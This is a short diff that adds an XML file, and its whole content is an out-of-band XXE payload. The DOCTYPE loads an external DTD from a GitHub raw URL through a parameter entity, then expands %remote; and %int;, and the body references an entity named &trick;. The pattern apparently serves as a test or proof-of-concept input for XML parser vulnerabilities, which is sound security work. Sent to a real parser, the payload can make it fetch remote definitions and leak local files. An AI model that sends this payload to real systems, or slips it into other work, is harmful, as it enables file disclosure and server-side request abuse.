@@ -1,0 +1,3 @@
+<?xml version="1.0" encoding="utf-8" ?>
+<!DOCTYPE a [ <!ENTITY % remote SYSTEM "https://raw.githubusercontent.com/sathish09/test/master/file.dtd">%remote;%int;]>
+<a>&trick;</a>
